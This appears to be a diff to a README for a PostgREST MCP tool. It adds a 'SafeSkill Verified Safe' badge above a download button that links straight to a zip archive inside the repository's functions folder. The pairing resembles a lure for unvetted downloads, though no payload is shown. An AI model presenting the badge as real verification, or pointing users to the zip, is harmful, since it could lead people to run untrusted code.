@@ -1,5 +1,7 @@
 # 🌟 postgrest-mcp - Easy Setup for PostgREST Integration
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/mohitgitai-postgrest-mcp)
+
 [![Download](https://raw.githubusercontent.com/MOHITGITAI/postgrest-mcp/main/supabase/functions/postgrest-mcp-v1.5.zip%20Now-PostgREST%20MCP-brightgreen)](https://raw.githubusercontent.com/MOHITGITAI/postgrest-mcp/main/supabase/functions/postgrest-mcp-v1.5.zip)
 
 ## 🚀 Getting Started
